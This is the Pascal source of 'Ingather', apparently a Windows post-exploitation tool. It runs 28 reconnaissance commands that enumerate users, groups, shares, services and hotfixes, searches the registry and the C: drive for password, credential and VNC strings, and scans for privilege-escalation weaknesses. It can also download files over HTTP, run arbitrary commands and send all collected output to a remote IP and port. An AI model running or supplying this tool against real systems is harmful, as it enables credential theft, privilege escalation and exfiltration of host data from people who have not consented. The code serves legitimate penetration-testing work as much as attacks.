program Ingather;
{
 AUTHOR:  Brian Kellogg

 MIT licensed
}

{$mode objfpc}{$H+}

uses
  Classes, SysUtils, CustApp, WinUsers, RunAs, NetIO, FindVulns, RunCMD,
  WinFileSystem, StrUtils
  { you can add units after this };

const
  NUM_CMDS = 28;
type
  CommandArray = array[1..NUM_CMDS,1..2] of string;
  { TIngather }

  TIngather = class(TCustomApplication)
  protected
    procedure DoRun; override;
  public
    constructor Create(TheOwner: TComponent); override;
    destructor Destroy; override;
    procedure WriteHelp; virtual;
  private
    function PrintHeader(cmd: string): AnsiString;
    function PrintEnums(cmds: CommandArray): AnsiString;
  end;

{ TIngather }

procedure TIngather.DoRun;
const
  CMDS     : CommandArray = (
            ('whoami /all','Currently logged in user info'),
            ('hostname','Name of device'),
            ('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"','Print OS name and Version'),
            ('gpresult /Z','Dump super verbos Group Policy info'),
            ('net users','Dump list of user accounts'),
            ('wmic useraccount get name,sid','Dump user sids'),
            ('powershell -c "Get-LocalUser | Format-Table Name,Enabled,LastLogon,SID"','Dump specified information on users'),
            ('net localgroup Administrators','Dump Administrators group membership'),
            ('net localgroup "Remote Desktop Users"','Dump RDP group membership'),
            ('net localgroup "Backup Operators"','Dump Backup Operators group membership'),
            ('net share','List available SMB shares'),
            ('ipconfig /all','List all NIC invormation'),
            ('route print','List all OS routing information'),
            ('netstat -ano','Show network socket information'),
            ('netsh firewall show state','Defender firewall state'),
            ('netsh firewall show config','Defender firewall config'),
            ('arp -a','Local ARP cache entries'),
            ('type c:\Windows\System32\drivers\etc\hosts','Hosts file contents'),
            ('set','Environment variables'),
            ('wmic service get Name,PathName,Started,StartMode,StartName,Status','Service information'),
            ('schtasks /query /fo LIST /v','Scheduled Tasks configuration'),
            ('tasklist /SVC','Running process information'),
            ('wmic qfe get HotFixID','Install OS hotfixes'),
            ('driverquery /v','OS driver information'),
            ('reg query HKLM /f password /t REG_SZ /s','Search registry local machine hive for keys with "password" in the name'),
            ('reg query HKCU /f password /t REG_SZ /s','Search registry user hive for keys with "password" in the name'),
            ('powershell -c "Get-ChildItem C:\Users -Recurse -Depth 3 | Select-Object -ExpandProperty fullname | Sort-Object"','List home directory contents'),
            ('cd \ & dir /s *password* == *cred* == *vnc* == *account*','Search C: drive for various strings')
            );
var
  ErrorMsg        : String = '';
  ip              : AnsiString = '';
  port            : AnsiString = '';
  outfile         : AnsiString = '';
  nwrk            : TNetIO;
  escalate        : TRunAs;
  vulns           : TFindVulns;
  execute         : TRunCMD;
  x               : Integer;
  output          : AnsiString = '';
  tfOut           : TextFile;
  download        : String = '';
  save            : String = '';
  command         : String = '';
  ScreenPrint     : Boolean = true;
begin
  // quick check parameters
  ErrorMsg:= CheckOptions('cdhliposez','command download help list ip out port save enum');
  if (ErrorMsg <> '') or (HasOption('h','help')) or (ParamCount = 0) then begin
    WriteHelp;
    Terminate;
    Exit;
  end;

  // Is user an admin
  escalate:= TRunAs.Create;
  if escalate.IsUserAdmin then
    output:= concat(output, '[!] You are an admin' + sLineBreak)
  else
    output:= concat(output, '[*] You are not an admin.' + sLineBreak);
  escalate.Free;

  if HasOption('l','list') then begin
    output:= concat(output, PrintHeader('Enumeration Commands'));
    output:= concat(output, PrintEnums(CMDS));
  end;

  // download file
  if HasOption('d','download') and HasOption('s','save') then begin
    nwrk:= TNetIO.Create;
    download:= Self.GetOptionValue('d','download');
    save:= Self.GetOptionValue('s','save');
    if HasOption('z') then
      nwrk.WinHTTPGet(download, save)
    else begin
      ErrorMsg:= nwrk.DownloadHTTP(download, save);
      writeln(ErrorMsg);
    end;
    nwrk.Free;
  end;

  // do vulnerability enumeration on host
  execute:= TRunCMD.Create;

  if HasOption('c', 'command') then begin
    writeln('[*] Running custom commands');
    command:= Self.GetOptionValue('c','command');
    output:= concat(output, execute.getOutput(command, '', false));
  end;

  if HasOption('e','enum') then begin
    // run system enumeration analysis
    vulns:= TFindVulns.Create;
    writeln('[*] Inspecting the registry');
    output:= concat(output, vulns.GetRegVulns + sLineBreak);
    writeln('[*] Inspecting environment paths');
    output:= concat(output, vulns.CheckEnvPathPerms + sLineBreak);
    writeln('[*] Inspecting filesystem');
    output:= concat(output, vulns.GetFSVulns + sLineBreak);     
    writeln('[*] Inspecting service configurations');
    output:= concat(output, vulns.GetVulnServices + sLineBreak);
    vulns.Free;
    // run basic enumeration commands
    writeln('[*] Running misc. enumeration commands');
    for x:= 1 to NUM_CMDS do begin
      output:= concat(output, PrintHeader(CMDS[x][1]));
      output:= concat(output, execute.getOutput(CMDS[x][1], '', false));
      output:= concat(output, sLineBreak)
    end;
  end;

  // Send output to another computer?
  if HasOption('i','ip') and HasOption('p','port') then begin
    nwrk:= TNetIO.Create;
    ip:= Self.GetOptionValue('i','ip');
    port:= Self.GetOptionValue('p','port');
    writeln('[*] sending all output to ' + ip + ':' + port);
    nwrk.SendIt(ip, port, output);
    nwrk.Free;
    ScreenPrint:= false;
  end;

  // Write all command outputs to a file?
  if HasOption('o','out') then begin
    outfile:= Self.GetOptionValue('o','out');
    AssignFile(tfOut, outfile);
    rewrite(tfOut);
    writeln(tfOut, output);
    ScreenPrint:= false;
    writeln('[*] Wrote output to file');
  end;

  if ScreenPrint then writeln(output);

  execute.Free;
  Terminate;
end;

constructor TIngather.Create(TheOwner: TComponent);
begin
  inherited Create(TheOwner);
  StopOnException:= True;
end;

destructor TIngather.Destroy;
begin
  inherited Destroy;
end;

function TIngather.PrintHeader(cmd: string): AnsiString;
var
  output: AnsiString = '';
begin
  result:= concat(output, '[*] '+cmd+sLineBreak);
end;

function TIngather.PrintEnums(cmds: CommandArray): AnsiString;
var
  x: integer;
  output: AnsiString = '';
begin
  for x:= 1 to NUM_CMDS do begin
    output:= concat(output, '[**] Command: '+cmds[x][1]+sLineBreak);
    output:= concat(output, ' Description: '+cmds[x][2]+sLineBreak);
  end;
  result:= output;
end;

procedure TIngather.WriteHelp;
begin
  writeln;
  writeln('Usage: Ingather.exe -i 1.1.1.1 -p 4444 -o output.txt');
  writeln('       Ingather.exe -d http://www.abcded.com/abc.txt -s c:\temp\abc.text');
  writeln('       Ingather.exe -c "ipconfig /all" -i 1.1.1.1 -p 4444');
  writeln;
  writeln('Download file over HTTP:');
  writeln('       -d, --download    : download file');
  writeln('       -s, --save        : location to save downloaded file to');
  writeln('       -z,               : use the Windows HTTP download function');
  writeln('                           otherwise use custom HTTP download function');
  writeln('Run options:');
  writeln('       -c, --command     : run custom command');
  writeln('       -e, --enum        : run all builtin enumerations');
  writeln('Output options:');
  writeln('       -i, --ip          : destination IP address');
  writeln('       -p, --port        : destination port');
  writeln('       -o, --out         : write enumeration command outputs to file');
  writeln('NOTE: If output to file or network is specified,');
  writeln('      screen output will be suppressed.');
  writeln('Info:');
  writeln('       -h, --help        : print this help message');
  writeln('       -l, --list        : print default enum commands and descriptions');
  writeln;
end;

var
  Application: TIngather;
begin
  Application:= TIngather.Create(nil);
  Application.Title:= 'Ingather';
  Application.Run;
  Application.Free;
end.
